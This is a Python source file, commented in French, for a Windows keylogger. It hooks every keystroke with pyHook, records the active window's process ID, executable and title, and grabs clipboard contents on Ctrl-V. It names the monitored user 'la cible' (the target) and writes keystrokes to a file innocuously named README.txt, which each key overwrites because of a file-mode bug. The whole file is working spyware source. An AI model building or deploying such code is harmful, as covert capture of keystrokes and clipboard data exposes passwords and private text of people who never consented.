from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
    # Fenêtre active sur le bureau
    hwnd = user32.GetForegroundWindow()

    # ID du processus
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # Garde en mémoire l'ID du processus

    process_id = "%d" % pid.value

    # grab the executable
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    # Récupérer nom du processus
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # Fonction qui utilise GetWindowText (pour afficher les informations)
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)

    # Affichage des informations
    print("")
    print("[ PID: {} - {} - {}".format(process_id, executable.value, window_title.value))
    print("")

    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def KeyStroke(event):

    global current_window

    # vérification si la cible change de fenêtre
    if event.WindowName != current_window:

        current_window = event.WindowName
        get_current_process()

    if event.Ascii > 5 and event.Ascii < 256:
        f=open('README.txt','w')
        keystroke=chr(event.Ascii)
        f.write(keystroke)
        f.close()
        print(chr(event.Ascii)),
    else:
        # si [Ctrl-V], get the value on the clipboard
        if event.Key == "V":

            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print("[PASTE] - {}".format(pasted_value))

        else:

            print("[{}]".format(event.Key))

    # pass execution to next hook registered
    return True
# On définit notre PyHook
kl = pyHook.HookManager()
#On définit notre évènement de l'utilisateur
kl.KeyDown = KeyStroke

# cache toutes les touches préssés et continue l'execution
kl.HookKeyboard()
pythoncom.PumpMessages()
